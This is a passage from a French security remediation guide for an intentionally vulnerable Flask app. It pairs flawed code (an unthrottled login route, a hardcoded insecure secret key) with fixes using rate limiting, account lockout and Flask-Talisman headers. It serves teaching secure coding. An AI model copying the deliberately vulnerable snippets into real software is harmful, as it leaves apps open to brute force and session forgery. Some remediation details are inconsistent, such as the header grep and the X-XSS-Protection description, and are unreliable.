@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        email = request.form.get('email', '')
        password = request.form.get('password', '')
        # Peut être appelé des milliers de fois par seconde → brute-force possible
        ...
```

### ✅ Solution complète (vulnpyapp_remediated/)

**extensions.py — initialisation du limiter**
```python
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address

limiter = Limiter(key_func=get_remote_address)
```

**config.py — quotas par défaut**
```python
class Config:
    RATELIMIT_DEFAULT = "200 per hour"
    RATELIMIT_STORAGE_URI = "memory://"
```

**models.py — colonnes de lockout**
```python
class User(UserMixin, db.Model):
    failed_login_attempts = db.Column(db.Integer, default=0)
    locked_until = db.Column(db.DateTime, nullable=True)

    def is_locked(self) -> bool:
        if self.locked_until is None:
            return False
        return datetime.utcnow() < self.locked_until
```

**app.py — double stratégie : rate limiting IP + lockout compte**
```python
from extensions import limiter
from datetime import datetime, timedelta

@app.route('/login', methods=['GET', 'POST'])
@limiter.limit("5 per minute", methods=['POST'])  # ✅ Max 5 tentatives/min/IP
def login():
    if request.method == 'POST':
        try:
            data = LoginSchema().load(request.form.to_dict())
        except ValidationError:
            return render_template('login.html', error='Invalid input'), 400

        user = User.query.filter_by(email=data['email']).first()

        # ✅ Vérification du lockout compte (indépendant du rate limiting IP)
        if user and user.is_locked():
            app.logger.warning(f"Login attempt on locked account: {data['email']}")
            return render_template(
                'login.html',
                error='Account temporarily locked. Try again later.'
            ), 429

        if user and user.check_password(data['password']):
            # ✅ Réinitialiser le compteur d'échecs
            user.failed_login_attempts = 0
            user.locked_until = None
            db.session.commit()
            login_user(user, remember=False)
            return redirect(url_for('profile'))

        # ✅ Incrémenter le compteur d'échecs
        if user:
            user.failed_login_attempts = (user.failed_login_attempts or 0) + 1
            if user.failed_login_attempts >= 5:
                user.locked_until = datetime.utcnow() + timedelta(minutes=15)
                app.logger.warning(f"Account locked: user_id={user.id}")
            db.session.commit()

        # ✅ Message générique : ne pas confirmer si l'email existe
        return render_template('login.html', error='Invalid credentials'), 401

    return render_template('login.html')


# ✅ Gestionnaire d'erreur rate limiting
@app.errorhandler(429)
def rate_limited(e):
    return render_template('errors/429.html'), 429
```

### Vérification
```bash
pytest tests/test_security.py::TestRateLimiting -v
```

---

## 🟡 CORRECTION #15 — Headers de sécurité absents

### Localisation
```
Fichier : vulnpyapp/app.py, vulnpyapp/config.py
Absence : Flask-Talisman, headers HSTS, X-Frame-Options, X-Content-Type-Options
Route : Toutes les réponses HTTP
CWE-693 : Missing Security Header
```

### Code vulnérable

**vulnpyapp/app.py — absence de middleware Talisman**
```python
# ❌ VULNÉRABLE
from flask import Flask

app = Flask(__name__)
app.config['SECRET_KEY'] = 'default-insecure'

# Aucun header de sécurité n'est défini
# Les réponses HTTP exposent des informations et permettent des attaques navigateur
```

**Preuve de vulnérabilité**
```bash
curl -I http://localhost:5000/
# Réponse : aucun header HSTS, CSP, X-Frame-Options, etc.
# L'attaquant sait que c'est Flask (Server: Werkzeug/...)
```

### ✅ Solution complète (vulnpyapp_remediated/)

**extensions.py — initialiser Flask-Talisman**
```python
from flask_talisman import Talisman

talisman = Talisman()

def init_security(app):
    """Initialise les headers de sécurité via Flask-Talisman"""
    talisman.init_app(
        app,
        force_https=True,
        strict_transport_security=True,
        strict_transport_security_max_age=31536000,  # 1 an
        content_security_policy={
            'default-src': "'self'",
            'script-src': ["'self'", "'unsafe-inline'"],  # À affiner selon le projet
            'style-src': ["'self'", "'unsafe-inline'"],
            'img-src': "'self'",
            'font-src': "'self'",
        },
        content_security_policy_nonce_in=['script-src'],
        referrer_policy='strict-origin-when-cross-origin',
        x_frame_options='SAMEORIGIN',
        x_content_type_options='nosniff',
        x_xss_protection='1; mode=block',
    )
```

**app.py — créer_app() intègre les headers**
```python
from flask import Flask
from extensions import talisman, db, login_manager, csrf
from logging_config import configure_logging
from security import sanitize_html, admin_required

def create_app(config_name='production'):
    """Factory pattern avec headers de sécurité"""
    app = Flask(__name__)
    
    # Configuration
    if config_name == 'production':
        app.config['SECRET_KEY'] = os.environ.get('SECRET_KEY', 'change-this-in-prod')
        app.config['DEBUG'] = False
    else:
        app.config['DEBUG'] = True
        app.config['SECRET_KEY'] = 'dev-key'
    
    # Initialiser extensions
    db.init_app(app)
    login_manager.init_app(app)
    csrf.init_app(app)
    talisman.init_app(app)  # ✅ Headers de sécurité
    
    # Configurer logging structuré
    configure_logging(app)
    
    # Enregistrer blueprints
    # ...
    
    return app
```

### Impact de la correction

**Avant (vulnérable)** :
```
HTTP/1.1 200 OK
Server: Werkzeug/2.0
Content-Type: text/html; charset=utf-8

<!-- Aucun header de sécurité → attaquant sait le stack technologique -->
```

**Après (sécurisé)** :
```
HTTP/1.1 200 OK
Server: Werkzeug/2.0
Strict-Transport-Security: max-age=31536000; includeSubDomains
Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline'
X-Frame-Options: SAMEORIGIN
X-Content-Type-Options: nosniff
X-XSS-Protection: 1; mode=block
Referrer-Policy: strict-origin-when-cross-origin

<!-- Navigateur applique les restrictions : MITM, clickjacking, sniffing bloqués -->
```

### Headers détaillés

| Header | Bénéfice | Valeur recommandée |
|--------|----------|-------------------|
| HSTS | Force HTTPS, prévient MITM | `max-age=31536000; includeSubDomains` |
| X-Frame-Options | Bloque clickjacking | `SAMEORIGIN` ou `DENY` |
| X-Content-Type-Options | Prévient MIME sniffing | `nosniff` |
| CSP | Bloque les scripts injectés | `default-src 'self'` (puis affiner) |
| X-XSS-Protection | Désactive XSS filter dangereux | `1; mode=block` ou `;` |
| Referrer-Policy | Limite l'info de referrer | `strict-origin-when-cross-origin` |

### Vérification

```bash
# Test des headers
curl -I https://localhost:5000/ | grep -E "HSTS|CSP|X-Frame|X-Content"

# Tests automatisés
pytest tests/test_security.py::TestSecurityHeaders -v
```

---
